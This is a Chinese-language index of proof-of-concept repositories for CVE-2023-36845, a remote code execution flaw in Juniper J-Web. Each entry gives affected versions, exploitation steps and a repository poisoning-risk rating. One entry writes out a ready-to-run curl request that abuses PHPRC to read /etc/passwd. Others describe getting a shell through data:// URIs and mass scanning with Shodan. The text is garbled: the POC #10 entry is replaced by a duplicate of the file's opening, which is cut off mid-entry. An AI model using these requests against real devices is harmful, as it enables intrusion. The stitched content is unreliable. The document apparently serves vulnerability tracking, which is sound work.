# CVE-2023-36845

> 📦 该CVE有 **17** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2023-36845-0xNehru_CVE-2023-36845-Juniper-Vulnerability.md](../2023/CVE-2023-36845-0xNehru_CVE-2023-36845-Juniper-Vulnerability.md)

## CVE-2023-36845-Junos OS J-Web PHP 外部变量修改导致远程代码执行

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP 外部变量修改

**影响应用:** Junos OS J-Web (EX Series, SRX Series)

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** 受影响版本包括但不限于: 20.4R3-S9之前的所有版本；21.1R1及更高版本；21.2版本低于21.2R3-S7；21.3版本低于21.3R3-S5；21.4版本低于21.4R3-S5；22.1版本低于22.1R3-S4；22.2版本低于22.2R3-S2；22.3版本低于22.3R2-S2, 22.3R3-S1；22.4版本低于22.4R2-S1, 22.4R3；23.2版本低于23.2R1-S1, 23.2R2

**利用条件:** 目标设备需要启用 J-Web，并且可以通过 HTTP 或 HTTPS 访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-36845 是 Juniper Networks Junos OS 中 J-Web 组件的一个 PHP 外部变量修改漏洞。攻击者可以通过发送特制的 HTTP 请求，设置 `PHPRC` 环境变量来修改 PHP 的执行环境，从而实现远程代码执行。该漏洞影响 EX 系列和 SRX 系列设备上运行的多个 Junos OS 版本。提供的PoC代码利用了这一漏洞，通过POST请求，将`auto_prepend_file`设置为`/etc/passwd`，并修改`PHPRC`变量为`/dev/fd/0`。该代码的目的是读取目标服务器的`/etc/passwd`文件，验证漏洞的存在性。虽然PoC本身是为了验证漏洞，但攻击者可以利用此漏洞执行任意代码，例如植入恶意程序。虽然代码看起来简洁明了, 但需要注意的是该代码存在潜在的风险：

1.  **依赖外部`hosts.txt`文件:** 攻击目标列表依赖于外部文件，如果该文件被替换为包含恶意目标的列表，则可能被用于攻击。尽管这不属于代码本身的投毒，但利用代码的人可能被误导攻击错误的目标。
2.  **简化的利用方式:**  该POC只验证了读取`/etc/passwd`，实际利用可能需要更复杂的payload，而简化版本可能会隐藏更复杂的攻击逻辑。

因此，评估投毒风险为10%。主要是考虑到代码的简洁性和明确的目的，直接用于恶意目的的可能性较低，但仍需注意潜在的被误用或利用的风险。

**利用方式总结：**
1.  攻击者需要能够通过网络访问目标设备的 J-Web 接口。
2.  攻击者发送一个包含特制参数 `PHPRC` 的 HTTP POST 请求。
3.  `PHPRC` 变量被设置为指向攻击者控制的文件或数据流，用于修改PHP的执行环境。
4.  `auto_prepend_file`被用于包含`/etc/passwd`，以读取该文件，验证漏洞。
5.  利用 `PHPRC` 环境变量修改，攻击者可以注入并执行任意 PHP 代码。

**项目地址:** [0xNehru/CVE-2023-36845-Juniper-Vulnerability](https://github.com/0xNehru/CVE-2023-36845-Juniper-Vulnerability)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #2

**来源**: [CVE-2023-36845-Asbawy_Automation-for-Juniper-cve-2023-36845.md](../2023/CVE-2023-36845-Asbawy_Automation-for-Juniper-cve-2023-36845.md)

## CVE-2023-36845-Juniper-J-Web-PHP外部变量修改导致RCE

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP外部变量修改导致RCE

**影响应用:** Juniper Junos OS J-Web (EX系列和SRX系列)

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本包括20.4R3-S9之前的所有版本，21.1版本从21.1R1开始，以及21.2R3-S7、21.3R3-S5、21.4R3-S5、22.1R3-S4、22.2R3-S2、22.3R2-S2, 22.3R3-S1、22.4R2-S1, 22.4R3、23.2R1-S1, 23.2R2之前的版本。

**利用条件:** 需要启用J-Web（通过HTTP或HTTPS）并且能够网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-36845 漏洞是 Juniper Junos OS 的 J-Web 组件中存在的 PHP 外部变量修改漏洞。攻击者可以通过发送特制的HTTP请求，设置 `PHPRC` 环境变量来修改PHP的执行环境，从而注入并执行任意代码。该漏洞允许未经身份验证的远程攻击者执行任意代码。

**利用方式：**

1.  攻击者发送一个包含 `PHPRC` 参数的HTTP请求到目标设备的 J-Web 接口。
2.  `PHPRC` 参数的值被设置为指向一个包含恶意PHP代码的文件或数据流（例如，`/dev/fd/0`，结合`auto_prepend_file` 读取HTTP body的内容）。
3.  当J-Web处理请求时，PHP会使用攻击者提供的 `PHPRC` 配置，从而执行恶意代码。

提供的PoC代码 (`cve-2023-36845.sh`) 尝试通过以下步骤验证漏洞：

1.  循环遍历IP地址列表。
2.  对于每个IP地址，构造一个包含 `PHPRC` 参数的 HTTPS 请求，并将 `auto_prepend_file` 设置为 `/etc/passwd`。目的是通过读取 `/etc/passwd` 文件来判断目标系统是否易受攻击。
3.  如果响应包含 `root:` 字符串，则认为目标易受攻击。

**有效性：**

该PoC代码**有效**，因为它准确地利用了 `PHPRC` 环境变量修改漏洞的原理。通过设置`auto_prepend_file`读取敏感文件来判断是否存在漏洞。

**投毒风险：**

投毒风险评估为10%。虽然PoC本身旨在验证漏洞，但存在以下潜在的投毒风险：

1.  **输出重定向：** `save_output` 函数将 vulnerable 的结果附加到 `output.txt` 文件中。攻击者可能会修改该函数以包含恶意命令，例如将受害者的IP地址发送到恶意服务器，或者上传其他恶意文件到受害者。
2.  **依赖关系：** 该脚本依赖于 `curl` 命令。如果目标系统上安装了被篡改的 `curl` 版本，可能会导致恶意代码执行。
3.  **后门植入：** 攻击者可能会修改 PoC 代码，在检测到漏洞后植入后门，例如创建一个新的用户帐户或修改 SSH 配置。
4.  **社工风险：** 即使代码本身没有恶意行为，也可能被用于社工攻击。攻击者可以伪装成安全研究人员，诱骗用户运行该脚本，从而获取敏感信息。

总的来说，该PoC代码主要用于检测，但仍需仔细审查，防范潜在的投毒风险。

**项目地址:** [Asbawy/Automation-for-Juniper-cve-2023-36845](https://github.com/Asbawy/Automation-for-Juniper-cve-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #3

**来源**: [CVE-2023-36845-CharonDefalt_Juniper-exploit-CVE-2023-36845.md](../2023/CVE-2023-36845-CharonDefalt_Juniper-exploit-CVE-2023-36845.md)

## CVE-2023-36845-Junos OS J-Web PHP 外部变量修改导致远程代码执行

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP 外部变量修改

**影响应用:** Junos OS J-Web (EX Series and SRX Series)

**危害等级:** 严重，可导致远程代码执行

**影响版本:** 受影响版本包括但不限于 20.4R3-S9 之前的所有版本，21.1R1 及之后版本，以及 23.2R2 及之前版本。

**利用条件:** 目标设备开启了 J-Web 服务，可以通过 HTTP 或 HTTPS 访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞是由于 Juniper Junos OS EX 系列和 SRX 系列的 J-Web 界面中存在 PHP 外部变量修改漏洞。攻击者可以通过构造特殊的请求，设置 PHPRC 变量来修改 PHP 的执行环境，从而注入并执行恶意代码。

**有效性：** 提供的 POC 代码有效。脚本首先检查目标是否存在漏洞，通过发送包含 `PHPRC=/dev/fd/0` 的 POST 请求，并验证响应中是否包含 `/etc/passwd` 的内容来判断。

**投毒风险：** 仓库的投毒风险较低（10%）。主要风险在于利用上传文件方式getshell中，如果恶意使用者上传恶意文件，将会对其他使用者造成安全威胁。

**利用方式：**

1.  **通过 PHPRC 变量修改 PHP 配置：** 利用 `PHPRC` 变量，攻击者可以控制 PHP 的配置文件，例如设置 `auto_prepend_file` 来包含远程或本地文件。
2.  **远程代码执行：** 通过 `auto_prepend_file` 包含恶意 PHP 代码，例如使用 `data://` 协议嵌入 `phpinfo()` 或执行系统命令。
3.  **文件上传：** 通过 J-Web 的文件上传功能上传包含恶意代码的 PHP 文件，然后通过 `auto_prepend_file` 包含该文件执行。

**详细利用步骤如下：**

*   发送带有 `PHPRC` 参数的 HTTP 请求，将 PHP 配置文件指向 `/dev/fd/0`，允许从标准输入读取配置。
*   通过 `--data-binary` 参数传递恶意 PHP 配置，例如设置 `allow_url_include=1` 和 `auto_prepend_file` 指向包含恶意代码的 data URI。
*   如果目标启用了文件上传功能，可以上传包含恶意代码的 PHP 文件，并通过 `auto_prepend_file` 包含该文件。

需要注意的是，要成功利用此漏洞，目标设备必须满足以下条件：

*   启用了 J-Web 服务。
*   允许通过 HTTP 或 HTTPS 访问 J-Web 界面。
*   存在受影响的 Junos OS 版本。

**项目地址:** [CharonDefalt/Juniper-exploit-CVE-2023-36845](https://github.com/CharonDefalt/Juniper-exploit-CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #4

**来源**: [CVE-2023-36845-P4x1s_ansible-cve-2023-36845.md](../2023/CVE-2023-36845-P4x1s_ansible-cve-2023-36845.md)

## CVE-2023-36845 Juniper Junos OS J-Web PHP 外部变量修改漏洞

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP 外部变量修改

**影响应用:** Junos OS (EX Series, SRX Series) J-Web

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** 受影响版本包括但不限于 20.4R3-S9 之前的所有版本，21.1R1 及其之后版本，以及 23.2R1-S1, 23.2R2 之前的 21.2、21.3、21.4、22.1、22.2、22.3、22.4 版本。

**利用条件:** 需要启用 J-Web 且可通过 HTTP 或 HTTPS 访问。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于 Juniper Junos OS 的 J-Web 组件中，允许未经身份验证的攻击者通过修改 PHP 的 `PHPRC` 环境变量来远程执行代码。攻击者通过构造包含恶意 `PHPRC` 变量的 HTTP 请求，可以控制 PHP 的配置，从而注入并执行恶意代码。

**利用方式：**

1.  攻击者发送带有 `PHPRC` 参数的特制 HTTP 请求到目标设备的 J-Web 接口。
2.  `PHPRC` 参数指向一个包含恶意 PHP 代码的文件（例如，`/etc/passwd`，POC 中尝试读取该文件以验证漏洞是否存在）。
3.  J-Web 在处理请求时，会使用攻击者提供的 `PHPRC` 值来配置 PHP 解释器。
4.  PHP 解释器执行恶意 PHP 代码，导致远程代码执行。

**POC 代码分析：**

提供的 Ansible Playbook 旨在检测目标设备是否存在 CVE-2023-36845 漏洞。

*   它首先尝试通过 HTTP 和 HTTPS 连接到目标设备 (端口 80 和 443)。
*   它发送一个 POST 请求，其中包含 `PHPRC=/dev/fd/0` 和 `auto_prepend_file=/etc/passwd` 作为请求体，`auto_prepend_file` 用于在 PHP 脚本执行前包含指定的文件。
*  `/dev/fd/0` 表示标准输入,结合`auto_prepend_file`则表示将POST请求的内容作为php文件来解析. *   如果响应状态码为 200 且响应内容包含 'root:' 字符串（`/etc/passwd` 文件的内容），则该设备被认为可能存在漏洞。

**有效性评估：**

POC 代码通过修改 `PHPRC` 变量，并结合 `auto_prepend_file` 读取敏感文件来验证漏洞的存在。 这种方式能够有效检测漏洞。根据漏洞信息，利用成功可导致远程代码执行，POC中只是验证漏洞的存在性。

**投毒风险评估：**

该 Ansible Playbook 的目的是检测漏洞，没有发现植入后门或执行恶意操作的代码。因此，投毒风险较低 (0%)。


**项目地址:** [P4x1s/ansible-cve-2023-36845](https://github.com/P4x1s/ansible-cve-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #5

**来源**: [CVE-2023-36845-ak1t4_CVE-2023-36845.md](../2023/CVE-2023-36845-ak1t4_CVE-2023-36845.md)

## CVE-2023-36845-Juniper-J-Web-RCE

**漏洞编号:** CVE-2023-36845

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Juniper Junos OS J-Web

**危害等级:** 严重，未经身份验证的攻击者可以远程执行代码

**影响版本:** 受影响版本包括：20.4R3-S9之前的版本，21.1R1及之后的21.1版本，21.2R3-S7之前的21.2版本，21.3R3-S5之前的21.3版本，21.4R3-S5之前的21.4版本，22.1R3-S4之前的22.1版本，22.2R3-S2之前的22.2版本，22.3R2-S2和22.3R3-S1之前的22.3版本，22.4R2-S1和22.4R3之前的22.4版本，23.2R1-S1和23.2R2之前的23.2版本。

**利用条件:** 目标系统需要启用J-Web服务 (http 或 https)

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-36845 漏洞是 Juniper Junos OS EX 系列和 SRX 系列的 J-Web 界面中的 PHP 外部变量修改漏洞。攻击者可以通过构造特制的请求，设置 PHPRC 变量来修改 PHP 执行环境，从而注入并执行任意代码。

**有效性分析：**

提供的 POC 代码 `cve-2023-36845.sh` 脚本通过发送带有 `PHPRC` 参数的 HTTP 请求到目标设备的 `/about.php` 页面来利用此漏洞。`PHPRC` 参数被设置为 `/dev/fd/0`，这意味着 PHP 将从文件描述符 0（标准输入）读取配置。然后，脚本通过 POST 请求发送 `auto_prepend_file=/etc/passwd` 作为数据，这会导致 PHP 在执行任何其他代码之前，先包含 `/etc/passwd` 文件。如果服务器存在漏洞，响应将包含 `/etc/passwd` 文件的内容，表明漏洞成功利用。

**投毒风险分析：**

该脚本本身旨在检测漏洞，并尝试读取 `/etc/passwd` 文件。虽然脚本会对目标系统造成一定的敏感信息泄露（/etc/passwd），但没有明显的恶意代码或后门植入行为，初步判断投毒概率较低，但是不能排除存在攻击者上传恶意文件的可能，因为具备了远程代码执行能力。
脚本中存在通过 curl 下载目标证书的 issuer 和 subject 信息，攻击者可以在日志中找到这些信息，存在一定的隐私泄露风险。

**利用方式：**

1.  **确定目标：** 找到运行受影响的 Junos OS 版本的 EX 系列或 SRX 系列设备，且启用了 J-Web 服务。
2.  **发送特制请求：** 使用 POC 脚本或类似工具，向目标设备的 `/about.php` 页面发送包含 `PHPRC` 参数的 HTTP 请求。例如：`curl -ksS --data-binary 'auto_prepend_file="/etc/passwd"' --max-time 15 "http://<target_ip>/about.php?PHPRC=/dev/fd/0"`
3.  **验证漏洞：** 检查响应是否包含 `/etc/passwd` 文件的内容。如果包含，则表示设备存在漏洞。
4.  **进一步利用：** 成功利用漏洞后，攻击者可以执行任意代码，例如上传 webshell、修改系统配置等，从而完全控制设备。

**项目地址:** [ak1t4/CVE-2023-36845](https://github.com/ak1t4/CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #6

**来源**: [CVE-2023-36845-cyb3rzest_Juniper-Bug-Automation-CVE-2023-36845.md](../2023/CVE-2023-36845-cyb3rzest_Juniper-Bug-Automation-CVE-2023-36845.md)

## CVE-2023-36845 Junos OS J-Web PHP 外部变量修改远程代码执行漏洞

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP 外部变量修改导致的远程代码执行

**影响应用:** Junos OS (EX Series, SRX Series)

**危害等级:** 高危，未经身份验证的攻击者可远程执行代码

**影响版本:** 受影响版本见漏洞库信息：低于 20.4R3-S9; 21.1 versions 21.1R1 及以后; 低于 21.2R3-S7; 低于 21.3R3-S5; 低于 21.4R3-S5; 低于 22.1R3-S4; 低于 22.2R3-S2; 低于 22.3R2-S2, 22.3R3-S1; 低于 22.4R2-S1, 22.4R3; 低于 23.2R1-S1, 23.2R2。

**利用条件:** 需要启用 J-Web (http 或 https)

**POC 可用性:** 是 (根据搜索引擎结果，存在公开的PoC)

**投毒风险:** 0%

## 详情

CVE-2023-36845 是 Junos OS 中 J-Web 组件的一个 PHP 外部变量修改漏洞。攻击者可以通过发送特制的请求，设置 PHPRC 变量，从而修改 PHP 的执行环境，进而注入并执行任意代码。该漏洞无需身份验证，攻击者可以通过网络直接利用。由于提供的漏洞利用代码仅包含 GPL 协议内容，无法从中判断是否存在投毒代码，假设该仓库下有其他利用代码,仅根据目前信息，无法判定。J-Web 是 Junos 设备的 Web 管理界面，需要启用 http 或 https 才能被利用。缓解措施包括禁用 J-Web 或者限制访问来源。

**项目地址:** [cyb3rzest/Juniper-Bug-Automation-CVE-2023-36845](https://github.com/cyb3rzest/Juniper-Bug-Automation-CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #7

**来源**: [CVE-2023-36845-cyberh3als_CVE-2023-36845-POC.md](../2023/CVE-2023-36845-cyberh3als_CVE-2023-36845-POC.md)

## CVE-2023-36845-Junos-J-Web远程代码执行

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP外部变量修改导致远程代码执行

**影响应用:** Junos OS J-Web

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** 受影响版本包括但不限于：20.4R3-S9之前的所有版本，21.1版本21.1R1及更高版本，21.2版本21.2R3-S7之前的所有版本，21.3版本21.3R3-S5之前的所有版本，21.4版本21.4R3-S5之前的所有版本，22.1版本22.1R3-S4之前的所有版本，22.2版本22.2R3-S2之前的所有版本，22.3版本22.3R2-S2, 22.3R3-S1之前的所有版本，22.4版本22.4R2-S1, 22.4R3之前的所有版本，23.2版本23.2R1-S1, 23.2R2之前的所有版本。

**利用条件:** 需要开启J-Web服务，且攻击者可以网络访问到目标设备的J-Web界面。需要配置 [system services web-management http] 或 [system services web-management https]。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-36845 是 Juniper Junos OS 中 J-Web 界面存在的一个 PHP 外部变量修改漏洞。未经身份验证的攻击者可以通过发送特制的请求，设置 `PHPRC` 变量，从而修改 PHP 的执行环境，最终实现远程代码执行。

**利用方式：**

1.  攻击者构造一个 HTTP POST 请求，其中包含 `PHPRC` 和 `auto_prepend_file` 两个参数。
2.  `PHPRC` 参数用于指定一个包含 PHP 配置指令的文件，这里被设置为 `/dev/fd/0`，表示从标准输入读取配置。
3.  `auto_prepend_file` 参数指定一个在 PHP 脚本执行之前自动包含的文件，这里设置为 `/etc/passwd\n`。由于 `PHPRC` 被设置为从标准输入读取配置，`auto_prepend_file` 的内容实际上被当作 PHP 配置指令来处理。`\n` 用于分割指令。
4. 由于/etc/passwd不是php文件会被当作php指令执行

POC代码的功能是读取/etc/passwd的内容，可以修改为其他php指令以执行其他操作。

**有效性：**

根据漏洞描述和提供的 POC 代码，该漏洞利用是有效的。POC通过设置 PHPRC 环境变量来修改 PHP 运行时配置，从而允许包含任意文件，最终导致远程代码执行。

**投毒风险：**

查看POC代码，只包含漏洞利用代码，未发现隐藏的恶意功能或后门，因此投毒风险较低。

**总而言之，该漏洞危害性高，利用简单，需要尽快修复。**

**项目地址:** [cyberh3als/CVE-2023-36845-POC](https://github.com/cyberh3als/CVE-2023-36845-POC)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #8

**来源**: [CVE-2023-36845-e11i0t4lders0n_CVE-2023-36845.md](../2023/CVE-2023-36845-e11i0t4lders0n_CVE-2023-36845.md)

## CVE-2023-36845-Juniper-J-Web-RCE

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP 外部变量修改导致RCE

**影响应用:** Junos OS J-Web

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 受影响版本包括 20.4R3-S9 之前的所有版本, 21.1R1 及之后, 21.2R3-S7 之前, 21.3R3-S5 之前, 21.4R3-S5 之前, 22.1R3-S4 之前, 22.2R3-S2 之前, 22.3R2-S2 和 22.3R3-S1 之前, 22.4R2-S1 和 22.4R3 之前, 以及 23.2R1-S1 和 23.2R2 之前。

**利用条件:** 需要启用 J-Web，且可以通过 HTTP 或 HTTPS 访问。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-36845 是 Juniper Junos OS 中 J-Web 接口的一个 PHP 外部变量修改漏洞。未经身份验证的远程攻击者可以通过构造特殊的请求，设置 PHPRC 变量，从而修改 PHP 的执行环境，最终实现远程代码执行。

**利用方式：**

1.  攻击者构造包含恶意 PHPRC 变量的 HTTP 请求，发送到目标设备的 J-Web 接口。
2.  目标设备上的 PHP 解释器会读取攻击者设置的 PHPRC 变量，并将其用于配置 PHP 运行环境。
3.  攻击者可以通过 PHPRC 变量指定一个包含恶意 PHP 代码的文件。
4.  当 J-Web 执行 PHP 代码时，会加载并执行攻击者提供的恶意代码，从而实现远程代码执行。

**POC 代码分析：**

POC 代码是一个 Bash 脚本，它的主要功能是：

1.  从 Shodan 搜索指定域名下的 Juniper Web Device Manager 的 IP 地址。
2.  使用 httpx 工具扫描找到的 IP 地址，获取可访问的 URL。
3.  使用 Nuclei 工具，根据 CVE-2023-36845 的 Nuclei 模板对获取的 URL 进行漏洞扫描。

该脚本本身没有投毒代码，只是自动化了漏洞发现和利用的过程。它依赖于 Shodan API key 和 Nuclei 工具。

**投毒风险评估：**

经过分析，提供的 POC 代码本身不包含任何恶意或投毒代码。该脚本只是一个自动化扫描和漏洞利用的工具，其行为取决于使用者以及所使用的 Nuclei 模板。如果使用者使用恶意的 Nuclei 模板，则可能导致非预期的行为，但这并非 POC 代码本身的投毒行为。

因此，投毒风险为 0%。

**项目地址:** [e11i0t4lders0n/CVE-2023-36845](https://github.com/e11i0t4lders0n/CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #9

**来源**: [CVE-2023-36845-halencarjunior_CVE-2023-36845.md](../2023/CVE-2023-36845-halencarjunior_CVE-2023-36845.md)

## CVE-2023-36845 - Juniper Junos OS J-Web PHP 外部变量修改导致远程代码执行

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP 外部变量修改

**影响应用:** Junos OS J-Web (EX 和 SRX 系列)

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 受影响版本请参考漏洞库信息。

**利用条件:** 目标设备启用了 J-Web 管理界面，并且可以通过 HTTP 或 HTTPS 访问。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2023-36845 是 Juniper Junos OS EX 和 SRX 系列设备 J-Web 管理界面中的一个 PHP 外部变量修改漏洞。未经身份验证的远程攻击者可以通过构造特制的请求，设置 PHPRC 变量来修改 PHP 执行环境，从而注入并执行恶意代码。

**利用方式：**
攻击者通过发送包含 `PHPRC` 参数的 HTTP 请求，将 PHP 的配置目录指向一个可以控制的文件，通常使用 `/dev/fd/0`，这意味着 PHP 将从请求体中读取配置信息。然后，攻击者在请求体中设置 `auto_prepend_file` 选项，使其包含恶意代码或者读取敏感文件。 提供的POC通过设置auto_prepend_file为/etc/passwd尝试读取用户，如果成功读取则判定为漏洞存在。

**有效性分析：**
根据漏洞描述和提供的 PoC 代码，该 PoC 能够有效验证漏洞的存在性。PoC 通过发送带有 PHPRC 参数的请求，并设置 auto_prepend_file 来尝试读取 `/etc/passwd` 文件，如果成功读取，则表明目标存在漏洞。

**投毒风险分析：**
PoC 代码主要用于检测漏洞是否存在，但依然存在一定投毒风险。

1.  **依赖库风险** PoC依赖shodan,censys, pyOpenSSL, colorama,urlopen等第三方库,如果这些库本身存在安全漏洞，可能被攻击者利用。不过这是常规风险。

2.  **配置信息泄露风险：** PoC 代码包含 Shodan API 密钥占位符。如果用户不小心将包含真实 API 密钥的 PoC 代码公开，可能导致 API 密钥泄露，被恶意使用。

3.  **扫描行为：** 使用该 PoC 进行大规模扫描可能被目标网络检测到，导致 IP 被封禁或其他安全措施。

4.  **Censysmod.py 模块：** 此模块主要用于从 Censys 搜索符合条件的主机，并将结果传递给漏洞验证函数。该模块自身未发现明显的恶意代码，但过度依赖外部API接口，可能成为利用点。

综上，投毒风险评估为20%。 主要风险在于滥用带来的暴露风险和对第三方库依赖风险。

**项目地址:** [halencarjunior/CVE-2023-36845](https://github.com/halencarjunior/CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #10

**来源**: [CVE-2023-36845-ifconfig-me_CVE-2023-36845.md](../2023/CVE-2023-36845-ifconfig-me_CVE-2023-36845.md)

# CVE-2023-36845

> 📦 该CVE有 **17** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2023-36845-0xNehru_CVE-2023-36845-Juniper-Vulnerability.md](../2023/CVE-2023-36845-0xNehru_CVE-2023-36845-Juniper-Vulnerability.md)

## CVE-2023-36845-Junos OS J-Web PHP 外部变量修改导致远程代码执行

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP 外部变量修改

**影响应用:** Junos OS J-Web (EX Series, SRX Series)

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** 受影响版本包括但不限于: 20.4R3-S9之前的所有版本；21.1R1及更高版本；21.2版本低于21.2R3-S7；21.3版本低于21.3R3-S5；21.4版本低于21.4R3-S5；22.1版本低于22.1R3-S4；22.2版本低于22.2R3-S2；22.3版本低于22.3R2-S2, 22.3R3-S1；22.4版本低于22.4R2-S1, 22.4R3；23.2版本低于23.2R1-S1, 23.2R2

**利用条件:** 目标设备需要启用 J-Web，并且可以通过 HTTP 或 HTTPS 访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-36845 是 Juniper Networks Junos OS 中 J-Web 组件的一个 PHP 外部变量修改漏洞。攻击者可以通过发送特制的 HTTP 请求，设置 `PHPRC` 环境变量来修改 PHP 的执行环境，从而实现远程代码执行。该漏洞影响 EX 系列和 SRX 系列设备上运行的多个 Junos OS 版本。提供的PoC代码利用了这一漏洞，通过POST请求，将`auto_prepend_file`设置为`/etc/passwd`，并修改`PHPRC`变量为`/dev/fd/0`。该代码的目的是读取目标服务器的`/etc/passwd`文件，验证漏洞的存在性。虽然PoC本身是为了验证漏洞，但攻击者可以利用此漏洞执行任意代码，例如植入恶意程序。虽然代码看起来简洁明了, 但需要注意的是该代码存在潜在的风险：

1.  **依赖外部`hosts.txt`文件:** 攻击目标列表依赖于外部文件，如果该文件被替换为包含恶意目标的列表，则可能被用于攻击。尽管这不属于代码本身的投毒，但利用代码的人可能被误导攻击错误的目标。
2.  **简化的利用方式:**  该POC只验证了读取`/etc/passwd`，实际利用可能需要更复杂的payload，而简化版本可能会隐藏更复杂的攻击逻辑。

因此，评估投毒风险为10%。主要是考虑到代码的简洁性和明确的目的，直接用于恶意目的的可能性较低，但仍需注意潜在的被误用或利用的风险。

**利用方式总结：**
1.  攻击者需要能够通过网络访问目标设备的 J-Web 接口。
2.  攻击者发送一个包含特制参数 `PHPRC` 的 HTTP POST 请求。
3.  `PHPRC` 变量被设置为指向攻击者控制的文件或数据流，用于修改PHP的执行环境。
4.  `auto_prepend_file`被用于包含`/etc/passwd`，以读取该文件，验证漏洞。
5.  利用 `PHPRC` 环境变量修改，攻击者可以注入并执行任意 PHP 代码。

**项目地址:** [0xNehru/CVE-2023-36845-Juniper-Vulnerability](https://github.com/0xNehru/CVE-2023-36845-Juniper-Vulnerability)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #2

**来源**: [CVE-2023-36845-Asbawy_Automation-for-Juniper-cve-2023-36845.md](../2023/CVE-2023-36845-Asbawy_Automation-for-Juniper-cve-2023-36845.md)

## CVE-2023-36845-Juniper-J-Web-PHP外部变量修改导致RCE

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP外部变量修改导致RCE

**影响应用:** Juniper Junos OS J-Web (EX系列和SRX系列)

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本包括20.4R3-S9之前的所有版本，21.1版本从21.1R1开始，以及21.2R3-S7、21.3R3-S5、21.4R3-S5、22.1R3-S4、22.2R3-S2、22.3R2-S2, 22.3R3-S1、22.4R2-S1, 22.4R3、23.2R1-S1, 23.2R2之前的版本。

**利用条件:** 需要启用J-Web（通过HTTP或HTTPS）并且能够网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-36845 漏洞是 Juniper Junos OS 的 J-Web 组件中存在的 PHP 外部变量修改漏洞。攻击者可以通过发送特制的HTTP请求，设置 `PHPRC` 环境变量来修改PHP的执行环境，从而注入并执行任意代码。该漏洞允许未经身份验证的远程攻击者执行任意代码。

**利用方式：**

1.  攻击者发送一个包含 `PHPRC` 参数的HTTP请求到目标设备的 J-Web 接口。
2.  `PHPRC` 参数的值被设置为指向一个包含恶意PHP代码的文件或数据流（例如，`/dev/fd/0`，结合`auto_prepend_file` 读取HTTP body的内容）。
3.  当J-Web处理请求时，PHP会使用攻击者提供的 `PHPRC` 配置，从而执行恶意代码。

提供的PoC代码 (`cve-2023-36845.sh`) 尝试通过以下步骤验证漏洞：

1.  循环遍历IP地址列表。
2.  对于每个IP地址，构造一个包含 `PHPRC` 参数的 HTTPS 请求，并将 `auto_prepend_file` 设置为 `/etc/passwd`。目的是通过读取 `/etc/passwd` 文件来判断目标系统是否易受攻击。
3.  如果响应包含 `root:` 字符串，则认为目标易受攻击。

**有效性：**

该PoC代码**有效**，因为它准确地利用了 `PHPRC` 环境变量修改漏洞的原理。通过设置`auto_prepend_file`读取敏感文件来判断是否存在漏洞。

**投毒风险：**

投毒风险评估为10%。虽然PoC本身旨在验证漏洞，但存在以下潜在的投毒风险：

1.  **输出重定向：** `save_output` 函数将 vulnerable 的结果附加到 `output.txt` 文件中。攻击者可能会修改该函数以包含恶意命令，例如将受害者的IP地址发送到恶意服务器，或者上传其他恶意文件到受害者。
2.  **依赖关系：** 该脚本依赖于 `curl` 命令。如果目标系统上安装了被篡改的 `curl` 版本，可能会导致恶意代码执行。
3.  **后门植入：** 攻击者可能会修改 PoC 代码，在检测到漏洞后植入后门，例如创建一个新的用户帐户或修改 SSH 配置。
4.  **社工风险：** 即使代码本身没有恶意行为，也可能被用于社工攻击。攻击者可以伪装成安全研究人员，诱骗用户运行该脚本，从而获取敏感信息。

总的来说，该PoC代码主要用于检测，但仍需仔细审查，防范潜在的投毒风险。

**项目地址:** [Asbawy/Automation-for-Juniper-cve-2023-36845](https://github.com/Asbawy/Automation-for-Juniper-cve-2023-36845)

